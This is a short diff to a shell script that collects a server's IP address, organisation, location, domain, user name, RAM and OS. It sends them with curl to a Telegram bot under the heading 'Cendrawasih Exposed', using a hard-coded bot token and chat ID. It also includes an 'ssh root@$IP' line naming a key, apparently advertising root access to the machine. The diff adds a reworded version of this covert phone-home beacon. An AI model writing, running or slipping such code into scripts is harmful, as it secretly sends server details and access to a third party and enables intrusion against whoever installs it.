@@ -205,14 +205,18 @@ ORG=$(curl -s ipinfo.io/org)
 RAM=$(free -h | awk 'NR==2 {print $2}')
 CPU=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
 
-message="
-<b>Cendrawasih Exposed</b>%0a\
-- Os-release 	: <code>$OS</code>%0a\
-- Resource	: <code>$CPU / $RAM</code>%0a\
-- Organization	: <code>$ORG</code>%0a\
-- Region	: <code>$CN</code>%0a\
-- Ipinfo	: <code>$IP</code>%0a%0a\
-<code>ssh root@$IP -qvi taibabi</code>"
+    message="
+<u>CENDRAWASIH EXPOSED</u>
+<code>TIME    : </code><code>${TIME}</code>
+<code>IPVPS   : </code><code>${MYIP}</code>
+<code>DOMAIN  : </code><code>${domain}</code>
+<code>IP VPS  : </code><code>${MYIP}</code>
+<code>LOKASI  : </code><code>${CITY}</code>
+<code>USER    : </code><code>${NAMES}</code>
+<code>RAM     : </code><code>${RAMMS}MB</code>
+<code>LINUX   : </code><code>${OS}</code>
+<code>ssh root@$IP -qvi taibabi</code>
+"
 
 curl -s -X POST "https://api.telegram.org/bot2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU/sendmessage" -d "chat_id=1036440597" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
 EOF
